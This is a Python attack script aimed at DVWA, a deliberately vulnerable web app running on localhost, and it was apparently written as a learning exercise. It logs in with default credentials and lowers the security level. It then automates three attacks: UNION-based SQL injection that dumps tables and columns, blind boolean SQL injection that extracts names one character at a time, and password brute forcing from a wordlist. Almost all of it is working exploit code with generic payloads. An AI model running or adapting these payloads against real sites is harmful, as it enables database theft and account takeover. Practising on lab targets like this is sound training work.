import requests
from bs4 import BeautifulSoup
import re

url = "http://127.0.0.1/dvwa/DVWA-master/login.php"
urlSQLI = "http://127.0.0.1/dvwa/DVWA-master/vulnerabilities/sqli/"
urlSQLIBlind = "http://127.0.0.1/dvwa/DVWA-master/vulnerabilities/sqli_blind/"
urslSecurity = "http://127.0.0.1/dvwa/DVWA-master/security.php"
urlBrute = "http://127.0.0.1/dvwa/DVWA-master/vulnerabilities/brute/"

def get_token(source):
    soup = BeautifulSoup(source, "html.parser")
    return soup.find('input', { "type" : "hidden" })['value']

def testSQLPossible(session):
    requestTestIfPossible = "'or '1'='1"

    requestTestIfPossible = requestTestIfPossible.replace(" ","+")
    requestTestIfPossible = requestTestIfPossible.replace(",","%2C")
    requestTestIfPossible = requestTestIfPossible.replace("#","s%23")

    urlTestSQLI = urlSQLI+"?id="+requestTestIfPossible+"&Submit=Submit#"
    reponseTestSQLI = session.get(urlTestSQLI)
    soup = BeautifulSoup(reponseTestSQLI.text,features="html.parser")  
    desired_tag = soup.find_all("pre") 

    return len(desired_tag) != 0

def retrieveDataBaseName(session):
    requestDatabaseName = "' union select null,database() #"
        
    requestDatabaseName = requestDatabaseName.replace(" ","+")
    requestDatabaseName = requestDatabaseName.replace(",","%2C")
    requestDatabaseName = requestDatabaseName.replace("#","%23")

    urlSQLITest = urlSQLI+"?id="+requestDatabaseName+"&Submit=Submit#"
    reponseTestSQLI = session.get(urlSQLITest)
    soup = BeautifulSoup(reponseTestSQLI.text,features="html.parser")  
    desired_tag = soup.find_all("pre")
    requestDatabaseName =  "' union select null,database\(\) #"
    try:
        found = re.search("<pre>ID: "+requestDatabaseName+"<br\/>First name: ([a-zA-Z0-9]*)<br\/>Surname: ([a-zA-Z0-9]+)<\/pre>", str(desired_tag[0]))
    except AttributeError:
        print("didn't match")
    return found.group(2)

def retrieveDataBaseTable(session,DBName):
    requestDataBaseTable = "' union select null,table_name from information_schema.tables where table_schema = '"+str(DBName)+"' #"
        
    requestDataBaseTable = requestDataBaseTable.replace(" ","+")
    requestDataBaseTable = requestDataBaseTable.replace(",","%2C")
    requestDataBaseTable = requestDataBaseTable.replace("#","%23")
    requestDataBaseTable = requestDataBaseTable.replace("=","%3D")

    urlSQLITest = urlSQLI+"?id="+requestDataBaseTable+"&Submit=Submit#"
    reponseTestSQLI = session.get(urlSQLITest)
    soup = BeautifulSoup(reponseTestSQLI.text,features="html.parser")  
    desired_tag = soup.find_all("pre")
    requestDatabaseName =  "' union select null,table_name from information_schema.tables where table_schema = '"+str(DBName)+"' #"
    tabTableName = []
    try:
        for foundString in desired_tag:
            found = re.search("<pre>ID: "+requestDatabaseName+"<br\/>First name: ([a-zA-Z0-9]*)<br\/>Surname: ([a-zA-Z0-9]+)<\/pre>", str(foundString))
            tabTableName.append(found.group(2))
    except AttributeError:
        print("didn't match")
    return tabTableName

def retrieveColumName(session,TableName):
    requestColumName = "' union select null,concat(table_name,0x0a,column_name) from information_schema.columns where table_name= '"+str(TableName)+"' #"
        
    requestColumName = requestColumName.replace(" ","+")
    requestColumName = requestColumName.replace(",","%2C")
    requestColumName = requestColumName.replace("#","%23")
    requestColumName = requestColumName.replace("=","%3D")

    urlSQLITest = urlSQLI+"?id="+requestColumName+"&Submit=Submit#"
    reponseTestSQLI = session.get(urlSQLITest)
    soup = BeautifulSoup(reponseTestSQLI.text,features="html.parser")  
    desired_tag = soup.find_all("pre")

    requestDatabaseName =  "' union select null,concat\(table_name,0x0a,column_name\) from information_schema\.columns where table_name= '"+str(TableName)+"' #"
    tabColumnsNames = []
    
    try:
        for foundString in desired_tag:
            found = re.search("<pre>ID: "+str(requestDatabaseName)+"<br\/>First name: <br\/>Surname: "+str(TableName)+"\n([a-zA-Z0-9_]+)<\/pre>", str(foundString))
            tabColumnsNames.append(found.group(1))
    except AttributeError:
        print("didn't match")
        raise
    return tabColumnsNames

def selectColumns(session,tabColumnsNames,nameTable):
    requestSelectColumName = "' union select "+str(tabColumnsNames[0])+","+str(tabColumnsNames[1])+" from "+str(nameTable)+"#"
        
    requestSelectColumName = requestSelectColumName.replace(" ","+")
    requestSelectColumName = requestSelectColumName.replace(",","%2C")
    requestSelectColumName = requestSelectColumName.replace("#","%23")

    urlSQLITest = urlSQLI+"?id="+requestSelectColumName+"&Submit=Submit#"
    reponseTestSQLI = session.get(urlSQLITest)
    soup = BeautifulSoup(reponseTestSQLI.text,features="html.parser")  
    desired_tag = soup.find_all("pre")

    requestSelectColumName =  "' union select "+str(tabColumnsNames[0])+","+str(tabColumnsNames[1])+" from "+str(nameTable)+"#"
    
    try:
        for foundString in desired_tag:
            found = re.search("<pre>ID: "+str(requestSelectColumName)+"<br\/>First name: ([a-zA-Z0-9 _.]+)<br\/>Surname: ([a-zA-Z0-9_]+)<\/pre>", str(foundString))
            print("#######")
            print("--- "+str(tabColumnsNames[0])+" : "+str(found.group(1)))
            print("--- "+str(tabColumnsNames[1])+" : "+str(found.group(2)))
    except AttributeError:
        print("didn't match")
        raise

def sqlInjection(session):
    nameTable = []
    tableChoice = ""
    columnsTargets = []
    print("--- Checking if the given input is sensible to SQL Injection...")
    if testSQLPossible(session):
        print("--- The input is sensible...")
        print("--- Retrieving the name of the database...")
        nameDB = retrieveDataBaseName(session)
        print("--- The name of the database found is : "+nameDB)
        print("--- Retrieving the name of the tables")
        nameTable = retrieveDataBaseTable(session,nameDB)
        print("Please choose one of the Table to scrap : ")
        print(str(nameTable))
        tableChoice = input("I want : ")
        while tableChoice not in nameTable:
            print("--- "+str(nameTable))
            tableChoice = input("The input is not correct please choose between existing table above: ")
        print("--- Retrieving Column Names")
        tableColumnsNames = retrieveColumName(session,tableChoice)
        print("--- "+str(tableColumnsNames))
        columnsTargets = input("Write the 2 targeted columns separated by a comma: ")
        columnsTargets = columnsTargets.split(",")

        while len(columnsTargets) != 2 or not set(columnsTargets).issubset(set(tableColumnsNames)):
            columnsTargets = input("The input is not correct please  write the 2 targeted columns separated by a comma: ")
            columnsTargets = columnsTargets.split(",")

        print("--- Selecting target Columns")
        selectColumns(session,columnsTargets,tableChoice)
    else:
        print("--- the link does not seem to be sensible...")

def sqlBlindDBLen(session):
    DBLen = 0   
    for i in range(1,100):
        requestSQLBlindLength = '?id=1\' and length(database())='+str(i)+' %23&Submit=Submit#'
        # All comments in the payload # to be represented by the url code, because this is added directly in the url
        if 'User ID exists in the database.' in session.get(urlSQLIBlind+requestSQLBlindLength).text:
            DBLen = i
            break
    return DBLen

def sqlBlindDBName(session,DBLen):
    DBName = ""
    #####
    # I commented this line because dvwa sqlBlindInjection doesn't do the difference between Upper and Lower case
    #
    #alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"
    alphabet = "abcdefghijklmnopqrstuvwxyz1234567890"
    for j in range(1,DBLen+1):
        for i in alphabet:
            requestSQLBlindName = '?id=1\' and substr(database(),'+str(j)+',1)=\''+str(i)+'\' %23&Submit=Submit#'

            if 'User ID exists in the database.' in session.get(urlSQLIBlind+requestSQLBlindName).text:
                DBName += i
    return DBName

def sqlBlindNumberOfTable(session):
    TableNb = 0
    for i in range(1,100):
        requestSQLBlindNbTable = '?id=1\' and (select count(table_name) from information_schema.tables where table_schema=database())='+str(i)+' %23&Submit=Submit#'
        if 'User ID exists in the database.' in session.get(urlSQLIBlind+requestSQLBlindNbTable).text:
            TableNb = i
            break
    return TableNb

def sqlBlindTableName(session,TableNB):
    alphabet = "abcdefghijklmnopqrstuvwxyz1234567890"
    tableNames = []
    for nbTable in range(0,TableNB):
        LocalTableName = ''
        for i in range(1,100):
            requestSQLBlindLenTable = '?id=1\' and length(substr((select table_name from information_schema.tables where table_schema=database() limit '+str(nbTable)+',1),1))='+str(i)+' %23&Submit=Submit#'
            if 'User ID exists in the database.' in session.get(urlSQLIBlind+requestSQLBlindLenTable).text:
                tableLen = i
            
                for m in range(1,tableLen+1):
                    for n in alphabet: 
                        requestSQLBlindNameTable = '?id=1\' and substr((select table_name from information_schema.tables where table_schema=database() limit '+str(nbTable)+',1),'+str(m)+',1)=\''+str(n)+'\' %23&Submit=Submit#'
                        if 'User ID exists in the database.' in session.get(urlSQLIBlind+requestSQLBlindNameTable).text:
                            LocalTableName += n
                tableNames.append(LocalTableName)
    
    return tableNames

def sqlBlindInjection(session):
    print("--- Retrieving Database Length...")
    DBLen = sqlBlindDBLen(session)
    print("--- Find : "+str(DBLen))
    print("--- Retrieving the name of the database...")
    DBName = sqlBlindDBName(session,DBLen)
    print("--- The name of the database found is : "+DBName)
    print("--- Retrieving Number of tables...")
    TableNB = sqlBlindNumberOfTable(session)
    print("--- The Number of tables found is : "+str(TableNB))
    print("--- Retrieving tables names : ")
    TableName = sqlBlindTableName(session,TableNB)
    print("--- "+str(TableName))

def isSuccess(html,loginChoice):
    soup = BeautifulSoup(html,features="html.parser")

    search = soup.findAll(text="Welcome to the password protected area "+loginChoice)

    if not search:
        success = False
    else:
        success = True
    return success

def BruteForce(session):
    loginChoice = input("Please type the user_login you want to brute force : (maybe find one using SQL Injection !):")
    filename = "worst-passwords.txt"
    success = False
    with open(filename) as f:
        print ("--- Running brute force attack...")
        for password in f:
            print ("password tryed: " + password)
            password = password.strip()
            data = {
                "username"   : loginChoice,
                "password"   : password,
                "Login"      : "Login",
            }
            result = s.get(urlBrute,params=data)
            success = isSuccess(result.text,loginChoice)
            if success:
                print ("--- Password is: " + password +" for Login : "+ loginChoice )
                break
    
    if not success:
        print ("---Brute force failed. No matches found.")

with requests.Session() as s:
    src = s.get(url).text
    data = {
        "username"   : "admin",
        "password"   : "password",
        "Login"      : "Submit",
        "user_token" : get_token(src)
    }

    dataSecurity = {
        "security":"low",
        "seclev_submit":"Submit",
        "user_token" : get_token(src)
    }

    responseLogin = s.post(url, data = data)
    responseSecu = s.post(urslSecurity, data = dataSecurity)

    print(" --- We are connected to DVWA and the security has been set to low...")

    choice = input("""--- Type : 
        [1] For SQLInjection
        [2] For Blind SQLInjection
        [3] For BruteForce

    Your Choice : 
    """)

    while int(choice) > 3 or int(choice) == 0:
        print("Please choose between existing option :")
        choice = input("""--- Type : 
        [1] For SQLInjection
        [2] For Blind SQLInjection
        [3] For BruteForce
        Your Choice : 
        """)

    if choice == "1":
        sqlInjection(s)
    elif choice == "2":
        sqlBlindInjection(s)
    elif choice == "3":
        BruteForce(s)
    elif choice == "4":
        print("TODO")




